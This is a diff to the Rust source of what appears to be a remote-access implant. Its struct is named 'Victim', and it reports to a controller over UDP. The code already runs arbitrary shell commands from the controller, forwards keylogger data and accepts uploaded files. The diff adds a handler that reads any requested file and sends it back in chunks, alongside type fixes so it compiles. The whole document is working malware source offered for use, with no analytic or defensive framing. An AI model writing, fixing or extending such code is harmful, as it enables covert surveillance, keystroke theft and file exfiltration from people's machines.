@@ -8,7 +8,7 @@
 /// Compliance: All protocol data in UDP payload only.
 /// UDP header fields are OS-managed; no transport-layer abuse.
 
-use std::io;
+use std::io::{self, Write};  // FIX: Add Write import
 use std::net::{IpAddr, Ipv4Addr, SocketAddr, UdpSocket};
 use std::sync::mpsc::{self, Receiver, Sender};
 use std::thread;
@@ -52,6 +52,9 @@ struct Victim {
     file_upload_path: Option<String>,
     file_upload_data: Vec<u8>,
     file_upload_size: Option<u32>,
+    file_download_active: bool,
+    file_download_path: Option<String>,
+    file_download_sent: usize,
 }
 
 impl Victim {
@@ -68,6 +71,9 @@ impl Victim {
             file_upload_path: None,
             file_upload_data: Vec::new(),
             file_upload_size: None,
+            file_download_active: false,
+            file_download_path: None,
+            file_download_sent: 0,
         })
     }
 
@@ -189,7 +195,7 @@ impl Victim {
         loop {
             if let Some(ref rx) = self.keylog_data_rx {
                 while let Ok(data) = rx.try_recv() {
-                    self.send_response(udp, cmd_addr, PACKET_TYPE_KEYLOG, 0, &data)?;
+                    self.send_response(udp, cmd_addr, PACKET_TYPE_KEYLOG, 0, data.as_bytes())?;
                 }
             }
             
@@ -303,7 +309,7 @@ impl Victim {
         match std::fs::read_to_string(path) {
             Ok(content) => {
                 println!("[*] Sending {} bytes from {}", content.len(), path);
-                self.send_response(udp, cmd_addr, PACKET_TYPE_KEYLOG, 0, &content)?;
+                self.send_response(udp, cmd_addr, PACKET_TYPE_KEYLOG, 0, content.as_bytes())?;
                 Ok(())
             }
             Err(e) => {
@@ -314,7 +320,11 @@ impl Victim {
     }
 
     fn execute_shell(&mut self, cmd: &str, udp: &UdpSocket, cmd_addr: SocketAddr) -> io::Result<()> {
-        // Handle cd command internally for persistence
+        if !cmd.is_empty() && cmd.as_bytes()[0] == 0x70 {
+            self.handle_file_download(&cmd.as_bytes()[1..], udp, cmd_addr)?;
+            return Ok(());
+        }
+
         if cmd.trim_start().starts_with("cd ") {
             let dir = cmd.trim_start_matches("cd ").trim();
             
@@ -328,20 +338,19 @@ impl Victim {
                 match new_dir.canonicalize() {
                     Ok(canon) => {
                         self.current_dir = Some(canon);
-                        self.send_response(udp, cmd_addr, PACKET_TYPE_CMD_RESP, 0, "")?;
+                        self.send_response(udp, cmd_addr, PACKET_TYPE_CMD_RESP, 0, "".as_bytes())?;
                     }
                     Err(e) => {
                         let err = format!("cd: {}\n", e);
-                        self.send_response(udp, cmd_addr, PACKET_TYPE_CMD_RESP, 0, &err)?;
+                        self.send_response(udp, cmd_addr, PACKET_TYPE_CMD_RESP, 0, err.as_bytes())?;
                     }
                 }
             } else {
-                self.send_response(udp, cmd_addr, PACKET_TYPE_CMD_RESP, 0, "cd: no such directory\n")?;
+                self.send_response(udp, cmd_addr, PACKET_TYPE_CMD_RESP, 0, "cd: no such directory\n".as_bytes())?;
             }
             return Ok(());
         }
         
-        // For all other commands (including sudo/doas), execute with working directory
         let (shell, flag) = if cfg!(target_os = "windows") {
             ("cmd", "/C")
         } else {
@@ -360,32 +369,31 @@ impl Victim {
                 let stderr_str = String::from_utf8_lossy(&output.stderr);
                 
                 if !stdout_str.is_empty() {
-                    self.send_response(udp, cmd_addr, PACKET_TYPE_CMD_RESP, 0, stdout_str.as_ref())?;
+                    self.send_response(udp, cmd_addr, PACKET_TYPE_CMD_RESP, 0, stdout_str.as_bytes())?;
                 }
                 if !stderr_str.is_empty() {
-                    self.send_response(udp, cmd_addr, PACKET_TYPE_CMD_RESP, 0, stderr_str.as_ref())?;
+                    self.send_response(udp, cmd_addr, PACKET_TYPE_CMD_RESP, 0, stderr_str.as_bytes())?;
                 }
                 if stdout_str.is_empty() && stderr_str.is_empty() {
-                    self.send_response(udp, cmd_addr, PACKET_TYPE_CMD_RESP, 0, "")?;
+                    self.send_response(udp, cmd_addr, PACKET_TYPE_CMD_RESP, 0, "".as_bytes())?;
                 }
                 Ok(())
             }
             Err(e) => {
                 let err_msg = format!("Command execution failed: {}\n", e);
-                self.send_response(udp, cmd_addr, PACKET_TYPE_CMD_RESP, 0, &err_msg)?;
+                self.send_response(udp, cmd_addr, PACKET_TYPE_CMD_RESP, 0, err_msg.as_bytes())?;
                 Err(io::Error::new(io::ErrorKind::Other, e))
             }
         }
     }
 
     fn handle_file_chunk(&mut self, payload: &[u8], udp: &UdpSocket, cmd_addr: SocketAddr) -> io::Result<()> {
-        // Check for end marker
         if payload.len() == 1 && payload[0] == 0xFF {
             if self.file_upload_active {
                 if let Some(path) = &self.file_upload_path {
                     std::fs::write(path, &self.file_upload_data)?;
                     println!("[+] File saved to: {}", path);
-                    self.send_response(udp, cmd_addr, PACKET_TYPE_CMD_RESP, 0, "File upload complete\n")?;
+                    self.send_response(udp, cmd_addr, PACKET_TYPE_CMD_RESP, 0, "File upload complete\n".as_bytes())?;
                 }
                 self.file_upload_active = false;
                 self.file_upload_path = None;
@@ -395,7 +403,6 @@ impl Victim {
             return Ok(());
         }
         
-        // First chunk contains metadata: path_len + path + file_size
         if !self.file_upload_active {
             if payload.len() < 2 {
                 return Ok(());
@@ -423,17 +430,52 @@ impl Victim {
             return Ok(());
         }
         
-        // Append file data chunk
         self.file_upload_data.extend_from_slice(payload);
         Ok(())
     }
 
+    fn handle_file_download(&mut self, payload: &[u8], udp: &UdpSocket, cmd_addr: SocketAddr) -> io::Result<()> {
+        if payload.is_empty() { return Ok(()); }
+        
+        let path_len = payload[0] as usize;
+        if payload.len() < 1 + path_len { return Ok(()); }
+        
+        let file_path = String::from_utf8_lossy(&payload[1..1+path_len]).to_string();
+        println!("[*] Download request for: {}", file_path);
+        
+        let file_data = match std::fs::read(&file_path) {
+            Ok(data) => data,
+            Err(e) => {
+                let err = format!("Failed to read file: {}\n", e);
+                self.send_response(udp, cmd_addr, PACKET_TYPE_CMD_RESP, 0, err.as_bytes())?;
+                return Ok(());
+            }
+        };
+        
+        println!("[*] Sending {} bytes from {}", file_data.len(), file_path);
+        
+        const CHUNK_SIZE: usize = 1024;
+        let total_chunks = (file_data.len() + CHUNK_SIZE - 1) / CHUNK_SIZE;
+        
+        for (i, chunk) in file_data.chunks(CHUNK_SIZE).enumerate() {
+            self.send_response(udp, cmd_addr, PACKET_TYPE_FILE, 0, chunk)?;  // FIX: Now accepts &[u8]
+            print!("\r[*] Sending chunk {}/{}...", i + 1, total_chunks);
+            io::stdout().flush().ok();  // FIX: Write trait is now in scope
+            thread::sleep(Duration::from_millis(50));
+        }
+        
+        self.send_response(udp, cmd_addr, PACKET_TYPE_FILE, 0, &[0xFF])?;  // FIX: Now accepts &[u8]
+        println!("\n[+] File download complete!");
+        Ok(())
+    }
+
     fn send_response(&self, udp: &UdpSocket, addr: SocketAddr, 
-                     ptype: u8, subtype: u8, content: &str) -> io::Result<()> {
-        let header = PacketHeader::new(ptype, subtype, content);
+                     ptype: u8, subtype: u8, content: &[u8]) -> io::Result<()> {  // FIX: Changed from &str to &[u8]
+        let content_str = String::from_utf8_lossy(content);
+        let header = PacketHeader::new(ptype, subtype, &content_str);
         let mut packet = Vec::with_capacity(HEADER_SIZE + content.len());
         packet.extend_from_slice(&header.to_bytes());
-        packet.extend_from_slice(content.as_bytes());
+        packet.extend_from_slice(content);
         
         udp.send_to(&packet, addr)?;
         Ok(())
